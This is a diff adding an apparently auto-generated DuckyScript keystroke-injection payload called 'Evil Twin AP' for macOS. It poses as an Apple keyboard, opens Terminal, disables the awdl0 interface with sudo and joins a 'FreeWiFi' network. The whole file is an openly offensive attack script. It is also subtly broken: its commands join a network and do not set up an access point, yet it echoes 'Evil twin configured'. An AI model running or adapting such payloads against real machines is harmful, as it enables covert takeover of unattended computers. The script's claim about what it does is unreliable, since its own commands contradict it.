@@ -1,0 +1,26 @@
+REM Author: Generated
+REM Title: Evil Twin AP
+REM Target: macOS
+REM Version: 1.0
+REM Category: Network-Attacks
+REM ---
+DELAY 1000
+REM Create soft AP (requires airbase-ng or similar)
+REM ID 05ac:021e Apple:Keyboard
+DELAY 1000
+GUI SPACE
+DELAY 500
+STRING terminal
+DELAY 500
+ENTER
+DELAY 1000
+STRING sudo ifconfig awdl0 down
+ENTER
+DELAY 500
+STRING sudo networksetup -setairportnetwork en0 FreeWiFi WPA2Pass123
+ENTER
+DELAY 1000
+STRING echo 'Evil twin configured'
+ENTER
+DELAY 500
+GUI w
